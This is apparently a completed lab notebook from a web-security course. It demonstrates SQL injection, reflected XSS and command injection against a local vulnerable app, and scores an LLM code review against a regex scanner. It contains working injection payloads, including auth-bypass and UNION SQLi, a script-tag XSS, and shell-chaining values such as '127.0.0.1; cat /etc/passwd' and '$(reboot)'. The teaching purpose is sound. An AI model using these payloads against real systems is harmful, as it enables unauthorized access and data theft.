# Week 6 Studio — Injection, Confirmed by an Oracle, and a Duel

**Task brief:** [`README.md`](README.md) · **Session 6A notebook:** [`../../notebooks/week-06-injection.ipynb`](../../notebooks/week-06-injection.ipynb) · **Given harness:** [`webharness.py`](webharness.py) · **Edited file:** [`starter.py`](starter.py) · **Rubric:** [`../../resources/control-scorecard.md`](../../resources/control-scorecard.md)

This notebook completes all three studio tasks against the course's own `vuln-web` app.

| Task | What | Where |
|---|---|---|
| 1 | Three **oracle-confirmed** findings: SQLi, reflected XSS, command injection | §1 |
| 2 | The **duel** — LLM arm vs. classical scanner, scored on a hand-built ground truth | §2 |
| — | The provided test suite, run unmodified | §3 |
| 3 | **Control Scorecard** (axes 1–4) for one finding + a responsible-disclosure note | §4 |

**The one idea (Session 6A).** Every injection is *one bug in three costumes*: untrusted
data crosses into a **control channel** — SQL, HTML/JS, or a shell command. The defenses
rhyme too (parameterize / encode / don't build the command from strings).

**The discipline (scorecard axis 3).** A finding is **not real until a *sound oracle*
confirms a security-relevant effect**. Reflection is not execution; a slow response is not
blind SQLi; *extracted data* is proof. A false positive in your tooling poisons every
number in your report.

> ⚠️ **Scope.** Everything runs on `127.0.0.1` — the in-process harness and (optionally) the
> course instance on `:8000`. Nothing here touches a network we were not authorized to test.
> See [`../../resources/ethics-and-scope.md`](../../resources/ethics-and-scope.md).


## Setup

`webharness.serve()` brings `vuln-web` up **in-process** on `127.0.0.1:8062` (stdlib only,
no Docker, no Ollama). That is the deterministic target the provided tests use, so we use it
here too. The vulnerable code we attack *and* scan is the single readable file
[`../../labs/vuln-web/app/vulnweb_app.py`](../../labs/vuln-web/app/vulnweb_app.py).

In [1]:
import sys, pathlib

# Put the course root (the dir containing seclab/) on the path.
ROOT = pathlib.Path.cwd()
while ROOT != ROOT.parent and not (ROOT / "seclab").is_dir():
    ROOT = ROOT.parent
if str(ROOT) not in sys.path:
    sys.path.insert(0, str(ROOT))
# And this studio folder, so `import starter` / `import webharness` work.
HERE = ROOT / "studios" / "week-06"
if str(HERE) not in sys.path:
    sys.path.insert(0, str(HERE))

import webharness
print("vuln-web (in-process) up at:", webharness.serve())
print("health:", webharness.get("/health"))

vuln-web (in-process) up at: http://127.0.0.1:8062
health: {"status": "ok"}


---
## §1 · Task 1 — Three confirmed findings

For each sink we build the payload(s), wire them through `seclab.attack.run_payloads`, and
confirm with a **sound oracle** plus a **benign control** that must *not* fire. The
implementations live in [`starter.py`](starter.py); we import and demonstrate them here.

In [2]:
import importlib
import starter
importlib.reload(starter)  # pick up the edited starter.py
from seclab.attack import print_summary

### 1.1 SQL injection — confirmed by *extracting data*, not by "the page changed"

`POST /login` builds its query with f-string interpolation:

```python
query = (f"SELECT user, secret FROM users "
         f"WHERE user = '{user}' AND pw = '{pw}'")
```

A login that merely *behaves* differently is only suggestive. **Proof** is pulling back the
admin canary `FLAG-sqli-9f2c-admin-session` — data we should never see. The oracle is
`contains_oracle("FLAG-sqli-")`: it confirms **only** when the canary is exfiltrated, never
when the payload is echoed. The benign control (`alice` + wrong password) must land at 0/1.

In [3]:
sqli = starter.confirm_sqli()
for f in sqli:
    tag = "CONFIRMED" if f.confirmed else "no effect"
    print(f"  [{f.payload.family:>6}] {tag:<10} {f.payload.intent:<34} {f.payload.text!r}")
    if f.confirmed:
        print(f"            evidence: {f.evidence}")
print_summary(sqli)

  [  sqli] CONFIRMED  auth bypass                        "admin' OR '1'='1"
            evidence: marker 'FLAG-sqli-' present
  [  sqli] CONFIRMED  comment-out the pw check           "admin'--"
            evidence: marker 'FLAG-sqli-' present
  [  sqli] CONFIRMED  UNION dump of the secret column    "x' UNION SELECT user, secret FROM users--"
            evidence: marker 'FLAG-sqli-' present
  [benign] no effect  real user, wrong password          'alice'

  3/4 payloads confirmed by the oracle

  family                 confirmed   tried  coverage
  --------------------------------------------------
  benign                         0       1       0%
  sqli                           3       3     100%


Every `sqli`-family payload leaked the canary; the **benign** real-user/wrong-password
login did **not** confirm. That contrast is the oracle discipline: the tool only cries
"breach" when real data crossed a boundary.

### 1.2 Reflected XSS — reflection is *not* execution

`GET /?name=` drops the input straight into HTML; `GET /safe?name=` runs it through
`html.escape()` first. We can't launch a browser here, so the **sound necessary condition**
for XSS is that the `<script>` tag survives **unescaped** in the body. We fire the *same*
marker payload at both endpoints: the vulnerable `/` must confirm, and the fixed `/safe`
must **not** — a true negative we carry into the duel. (We deliberately do *not* reuse
`contains_oracle` here: the payload *is* the marker, so it would confirm mere reflection —
the exact false positive this task is about.)

In [4]:
vuln_f, safe_f = starter.confirm_xss()
print("  vulnerable /      :", "CONFIRMED" if vuln_f.confirmed else "no effect",
      "->", vuln_f.evidence)
print("  fixed /safe       :", "CONFIRMED" if safe_f.confirmed else "no effect",
      "(true negative)", "->", safe_f.evidence)

# Show the raw bodies so the oracle's decision is auditable by eye.
marker = vuln_f.payload.text
print("\n  / body   :", webharness.reflect_send(marker).strip())
print("  /safe body:", webharness.reflect_safe_send(marker).strip())

  vulnerable /      : CONFIRMED -> unescaped <script> marker reflected into the body
  fixed /safe       : no effect (true negative) -> 

  / body   : <html><body><h1>Hello, <script>alert('XSS-FIRED-7f3a')</script>!</h1></body></html>
  /safe body: <html><body><h1>Hello, &lt;script&gt;alert(&#x27;XSS-FIRED-7f3a&#x27;)&lt;/script&gt;!</h1></body></html>


On `/` the literal `<script>` survives → a browser would execute it. On `/safe` it comes
back as `&lt;script&gt;...` → inert text. Same payload, opposite verdicts, because the oracle
checks **execution potential**, not the fact of reflection.

### 1.3 Command injection — confirm on the signal, not the echo

`POST /ping` concatenates `host` into `ping -c 1 {host}`. The lab **simulates** execution
(it reports `injection_detected`) so it is safe to run, but the bug — untrusted data reaching
a command context — is real. The sound oracle parses the JSON and confirms on
`injection_detected is True` (a shell metacharacter reached the command), **not** on the
host being echoed back. The benign plain host must stay clean.

In [5]:
cmdi = starter.confirm_cmdi()
for f in cmdi:
    tag = "CONFIRMED" if f.confirmed else "no effect"
    print(f"  [{f.payload.family:>6}] {tag:<10} {f.payload.intent:<30} {f.payload.text!r}")
print_summary(cmdi)

  [  cmdi] CONFIRMED  ; chains a 2nd command         '127.0.0.1; cat /etc/passwd'
  [  cmdi] CONFIRMED  && chains a 2nd command        '127.0.0.1 && whoami'
  [  cmdi] CONFIRMED  | pipes into a 2nd command     '127.0.0.1 | id'
  [  cmdi] CONFIRMED  $() command substitution       '$(reboot)'
  [benign] no effect  plain host, no metacharacters  '127.0.0.1'

  4/5 payloads confirmed by the oracle

  family                 confirmed   tried  coverage
  --------------------------------------------------
  benign                         0       1       0%
  cmdi                           4       4     100%


> **Reliability (axes 3 & 9).** Every payload here is deterministic (`successes == trials`),
> so `Finding.reliability` is 1.0 and nothing is flagged flaky. That changes the instant the
> target is a *model* (weeks 9–13): a payload that works 2/5 times is a different finding from
> one that works 5/5, and `run_payloads(..., trials=5)` is how you measure it.

### 1.4 (Optional) the *live* course instance on `:8000`

The studio is self-contained on `:8062`, but the course also left `vuln-web` running on
`:8000`. The code we attack is identical, so the same auth-bypass leaks the same canary
there. This cell is best-effort — it is skipped cleanly if `:8000` is not up.

In [6]:
import json, urllib.request

def live_login(user, pw="x", base="http://127.0.0.1:8000"):
    req = urllib.request.Request(base + "/login",
                                 data=json.dumps({"user": user, "pw": pw}).encode(),
                                 headers={"Content-Type": "application/json"})
    return urllib.request.urlopen(req, timeout=5).read().decode()

try:
    print("health:", urllib.request.urlopen("http://127.0.0.1:8000/health", timeout=5).read().decode())
    print("bypass:", live_login("admin' OR '1'='1"))
    print("benign:", live_login("alice", "wrong"))
except Exception as e:
    print("live :8000 not reachable (that's fine — the studio uses :8062):", type(e).__name__, e)

health: {"status": "ok"}
bypass: {"ok": true, "rows": [["admin", "FLAG-sqli-9f2c-admin-session"]]}
benign: {"ok": false}


---
## §2 · Task 2 — The duel: LLM vs. scanner

Point both arms at the **same source** (`vulnweb_app.py`) and score them against the
**hand-verified ground truth** with `seclab.scan.compare_scanners`.

- **Classical arm — GIVEN** (`webharness.regex_scanner`): a small line-oriented rule set
  standing in for Semgrep/CodeQL.
- **LLM arm — we write** `starter.parse_llm_review`: turn a model's free-text review into
  `ScanResult`s, **faithfully** — including its dubious findings. Whether they are real is
  decided by the ground truth, not by us.
- **Ground truth — REUSED** from [`../../projects/duel-2-web/ground_truth.json`](../../projects/duel-2-web/ground_truth.json),
  built by *reading the source*, not by running a tool (a ground truth that is "whatever the
  scanner found" rigs the duel).

In [7]:
from seclab.scan import compare_scanners, print_comparison
from webharness import regex_scanner, RAW_LLM_REVIEW, SOURCE, load_ground_truth

print("RAW LLM REVIEW (what a small local model returns):\n")
print(RAW_LLM_REVIEW)

RAW LLM REVIEW (what a small local model returns):

I reviewed vulnweb_app.py and found the following vulnerabilities:

1. [HIGH] SQL Injection in do_login: the query is built with f-string
   interpolation of `user` and `pw`, so an attacker can bypass authentication.
2. [HIGH] Reflected XSS in do_reflect: the `name` parameter is placed into the
   HTML response without any output encoding.
3. [HIGH] Command Injection in do_ping: the `host` value is concatenated into a
   shell command string.
4. [HIGH] Broken Access Control in do_login: there is no session or role check
   guarding the admin record, so any user can reach privileged data.
5. [MEDIUM] Reflected XSS in do_reflect_safe: the `name` parameter is reflected
   back to the user in the response.



In [8]:
llm = starter.parse_llm_review(RAW_LLM_REVIEW)
print("Parsed LLM findings -> ScanResults:")
for r in llm:
    print(f"  {r.key()!s:<42} severity={r.severity}")

print("\nClassical scanner findings:")
for r in regex_scanner(SOURCE):
    print(f"  {r.key()!s:<42} confidence={r.confidence}")

print("\nGround truth (hand-built, honest):")
for k in sorted(load_ground_truth()):
    print(f"  {k}")

Parsed LLM findings -> ScanResults:
  ('sqli', 'do_login')                       severity=high
  ('xss', 'do_reflect')                      severity=high
  ('cmdi', 'do_ping')                        severity=high
  ('broken-access-control', 'do_login')      severity=high
  ('xss', 'do_reflect_safe')                 severity=medium

Classical scanner findings:
  ('xss', 'do_reflect')                      confidence=medium
  ('cmdi', 'do_ping')                        confidence=medium

Ground truth (hand-built, honest):
  ('cmdi', 'do_ping')
  ('sqli', 'do_login')
  ('xss', 'do_reflect')


In [9]:
gt = load_ground_truth()
cmp = compare_scanners(
    {"regex-scanner": regex_scanner(SOURCE), "llm": llm}, gt)
print_comparison(cmp)

  tool             TP   FP   FN    prec  recall     F1
  ----------------------------------------------------
  regex-scanner     2    0    1    100%     67%   0.80
  llm               3    2    0     60%    100%   0.75

  Read this like a security engineer, not a leaderboard:

  - HIGH RECALL, LOW PRECISION (finds everything, cries wolf): an LLM often lands
    here. Every false positive is analyst time; a tool that reports 40 bugs where
    6 are real will be ignored within a week.
  - HIGH PRECISION, LOW RECALL (quiet but misses things): a narrow ruleset often
    lands here. What it misses is what hurts you.
  - The interesting cell is the FALSE POSITIVES the LLM invented and the TRUE bugs
    the scanner MISSED. Print both and read them out loud — that comparison is the
    deliverable, not the F1 score.

  regex-scanner missed (real bugs it did not report):
      ('sqli', 'do_login')

  llm false positives (hallucinated / wrong):
      ('broken-access-control', 'do_login')
      

### The three questions that matter more than F1

**1. What did the LLM hallucinate?**
It claimed `broken-access-control` in `do_login` — in an app with **no auth code at all** —
and flagged the **safe** endpoint `do_reflect_safe` (which is the `html.escape()` *fix*).
Both score as false positives against the honest ground truth.

**2. What did the scanner miss that the LLM caught?**
The **SQLi**. The scanner's rule is line-oriented (`re.search`, `.` doesn't cross newlines),
and the query spans two lines, so the interpolation never lands on the same line as `SELECT`.
A genuine failure mode, not a contrivance. The LLM, reasoning over the whole function, caught it.

**3. Broken Access Control specifically — did *either* find it, truthfully?**
**No.** The scanner has no rule for it; the LLM guessed and guessed wrong. Access control is
about **intent**, not syntax — which is exactly why it is OWASP-2021 **#1** and the class
automation is worst at.

In [10]:
# Make the "interesting cells" explicit (what the duel is actually about).
print("LLM false positives (hallucinated / wrong location):")
for k in cmp["llm"]["false_positives"]:
    print("   ", k)
print("\nScanner missed (real bugs it did not report):")
for k in cmp["regex-scanner"]["missed"]:
    print("   ", k)
print(f"\nLLM     : precision={cmp['llm']['precision']:.0%}  recall={cmp['llm']['recall']:.0%}  (high recall, high hallucination)")
print(f"Scanner : precision={cmp['regex-scanner']['precision']:.0%}  recall={cmp['regex-scanner']['recall']:.0%}  (precise but narrow)")

LLM false positives (hallucinated / wrong location):
    ('broken-access-control', 'do_login')
    ('xss', 'do_reflect_safe')

Scanner missed (real bugs it did not report):
    ('sqli', 'do_login')

LLM     : precision=60%  recall=100%  (high recall, high hallucination)
Scanner : precision=100%  recall=67%  (precise but narrow)


---
## §3 · The provided test suite, run unmodified

All six tests must pass. The guarantee test —
`test_scanner_misses_sqli_and_neither_finds_bac` — is the point of the week: it watches the
classical scanner's completeness **fail** (it misses the SQLi) and confirms that **neither**
arm cleanly finds Broken Access Control. That is OWASP-2021 #1 arriving as *data*.

In [11]:
import subprocess, os
env = dict(os.environ, PYTHONPATH=str(ROOT))
proc = subprocess.run([sys.executable, "test_studio.py"],
                      cwd=str(HERE), env=env, capture_output=True, text=True)
print(proc.stdout)
if proc.stderr:
    print("STDERR:\n", proc.stderr)
print("exit code:", proc.returncode)

  ok  SQLi: 3/3 payloads leaked the canary (confirmed by an extraction oracle, not a vibe)
  ok  benign login did NOT confirm — the oracle is not crying wolf
  ok  XSS confirmed on / and correctly REJECTED on /safe — reflection is not execution (axis 3)
  ok  cmdi confirmed on metacharacter payloads, clean on the benign host
  ok  parsed 5 LLM findings into ScanResults (faithfully, including the dubious ones)
  ok  scanner MISSED the SQLi and NEITHER arm found Broken Access Control — automation is worst at OWASP-2021 #1 (intent, not syntax)

all 6 tests pass

exit code: 0


---
## §4 · Task 3 — Control Scorecard + responsible disclosure

We fill axes **1–4** of the [Control Scorecard](../../resources/control-scorecard.md) for one
finding. We score the **control** that *would* defend the SQLi sink — a **parameterized query**
(prepared statement) replacing the f-string — because the scorecard grades a *defense*, and
"what guarantee does this control give, against whom, and how do we know" is the whole rubric.

> **Finding under evaluation:** SQL injection in `do_login` (`labs/vuln-web/app/vulnweb_app.py`),
> confirmed by leaking the admin canary `FLAG-sqli-9f2c-admin-session`.
> **Control under evaluation:** replace the f-string query with a parameterized query —
> `DB.execute("SELECT user, secret FROM users WHERE user=? AND pw=?", (user, pw))`.

| Axis | Before (vulnerable f-string) | After control (parameterized query) | Evidence |
|------|------------------------------|-------------------------------------|----------|
| **1 · Threat model** | Unauthenticated remote attacker, no credentials, can send arbitrary `user`/`pw` strings to `POST /login`. Goal: auth bypass + data exfiltration. | Unchanged — same adversary, same reach. | §1.1 attack; the attacker capability is "send any request body". |
| **2 · Guarantee** | **None.** Untrusted input is concatenated into SQL, so input *is* code. | Parameterized queries guarantee the `user`/`pw` values are bound as **data, never parsed as SQL** — *provided* **every** query on the path is parameterized and no value is later re-concatenated into dynamic SQL (e.g. no string-built `ORDER BY`/table names). The guarantee is **conditional on total coverage**: one string-built query reopens the hole. | DB-API placeholder semantics; the oracle in §1.1 confirms the *before* state leaks; a fixed copy returns `{"ok": false}` for all four payloads. |
| **3 · Coverage** | 0/4 of our payloads blocked (3 sqli confirmed, benign clean). A real evaluation uses ≥ 20 distinct payloads. | On our corpus (auth-bypass `OR '1'='1`, comment-out `--`, `UNION SELECT`, plus the benign control) a parameterized sink blocks **all** injection payloads while the benign login still succeeds: the metacharacters become literal username characters, matching no row. State plainly: this is a **sample**, not the whole input space. | `confirm_sqli()` payload set (§1.1); extend to 20+ for a graded duel. |
| **4 · Bypass** | — | **Attempted.** (a) *Second-order SQLi* — if a value stored via a parameterized insert is later concatenated into a dynamic query, the placeholder on the first hop does not protect the second: a real bypass of the *claim* "we use prepared statements" when coverage is partial. (b) *Non-parameterizable positions* — identifiers (table/column names, `ORDER BY`) can't be bound, so code that builds those from input stays injectable. (c) Classic payloads (`' OR '1'='1`, `UNION`, stacked queries) **fail** against a fully-parameterized sink — they are bound as literal text. Conclusion: the control is sound **for value positions with full coverage**; the residual risk lives in identifier positions and second-order flows. | Bypass reasoning above; verify by adding a dynamic `ORDER BY {col}` and re-running the oracle. |

**Why the SQLi finding, and not the LLM's BAC "finding"?** Because the scorecard rewards
*evidence quality*, not a verdict — and the BAC claim has none (it is a hallucination against
an app with no auth code, §2). Evaluating a control we can actually measure, and honestly
stating its condition and its bypass, scores higher than asserting "we're protected."

### Responsible-disclosure note (two lines)

> *The note we **would** send if this were a real app we were **authorized** to test — see
> [`../../resources/ethics-and-scope.md`](../../resources/ethics-and-scope.md) for what authorization means. The target here is `127.0.0.1`; this is a template, not a sent report.*

> **What/where:** Unauthenticated SQL injection in `POST /login` (`vulnweb_app.py`, `do_login`): the `user`/`pw` fields are interpolated into the SQL query with no parameterization.
> **Impact & fix:** An attacker bypasses authentication and exfiltrates arbitrary rows — we recovered the admin secret (`FLAG-sqli-…`) with `admin' OR '1'='1`. **Fix:** use parameterized queries (`execute(sql, (user, pw))`) on every DB call; do not build SQL from strings.


---
## Summary

- **Injection is one bug in three costumes**, and so are its defenses (parameterize / encode /
  don't build the command from strings).
- **A finding is not real until a sound oracle confirms it.** We proved SQLi by *extracting*
  the canary, XSS by an *unescaped* `<script>` surviving (rejecting the escaped `/safe` as a
  true negative), and cmdi by a *metacharacter reaching the command* — each with a benign
  control that stayed clean.
- **The LLM is high-recall, high-hallucination; the scanner is precise but narrow.** The
  scanner **missed the SQLi** (a 2-line query vs. a 1-line rule); **neither found Broken
  Access Control** — which is why OWASP-2021 #1 is #1: it is about intent, not syntax.
- **Non-determinism** (axis 9) is the moment the target becomes a model — flag it; it is
  weeks 9–13.
